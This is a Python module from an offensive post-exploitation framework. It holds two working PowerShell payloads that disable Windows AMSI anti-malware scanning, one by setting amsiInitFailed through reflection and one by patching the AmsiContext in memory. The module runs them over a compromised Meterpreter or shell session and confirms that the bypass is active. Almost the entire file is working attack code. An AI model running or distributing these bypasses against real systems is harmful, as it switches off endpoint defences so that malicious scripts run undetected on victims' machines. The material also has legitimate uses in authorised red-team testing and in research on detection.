#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin

_AMSI_INIT_FAILED = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
)

_AMSI_VARIANTS = {
    "amsi_init_failed": _AMSI_INIT_FAILED,
    "context_patch": (
        "$a=[Ref].Assembly.GetTypes();"
        "foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};"
        "$d=$c.GetFields('NonPublic,Static');"
        "foreach($e in $d){if($e.Name -like '*Context'){"
        "$f=$e.GetValue($null);[IntPtr]$ptr=$f;"
        "[Int32[]]$buf=@(0);"
        "[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}}"
    ),
}


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows AMSI Bypass",
        "description": (
            "Patch AMSI in the current PowerShell process (amsiInitFailed or "
            "AmsiContext byte patch) to allow script execution."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1562/001/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    variant = OptChoice(
        "amsi_init_failed",
        "AMSI bypass technique",
        False,
        choices=list(_AMSI_VARIANTS.keys()),
    )
    test_string = OptString(
        "amsiutils",
        "Test string after bypass (common AMSI signature probe)",
        False,
    )

    def _apply_amsi_bypass(self, variant: str) -> bool:
        script = _AMSI_VARIANTS.get(variant) or _AMSI_INIT_FAILED
        out = self.win_run_powershell(script, timeout=10)
        test = self.win_run_powershell(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').GetValue($null)",
            timeout=10,
        )
        if "True" in test:
            print_success(f"AMSI bypass ({variant}) appears active.")
            return True
        print_warning(f"AMSI bypass ({variant}) may have failed.")
        print_debug(out or test)
        return False

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        name = str(self.variant or "amsi_init_failed")
        print_status(f"Applying AMSI bypass: {name}")
        ok = self._apply_amsi_bypass(name)

        probe = str(self.test_string or "amsiutils")
        pq = self.win_ps_single_quote(probe)
        out = self.win_run_powershell(f"Write-Output '{pq}'", timeout=10)
        if out:
            print_info(f"Probe output: {out}")
        return ok
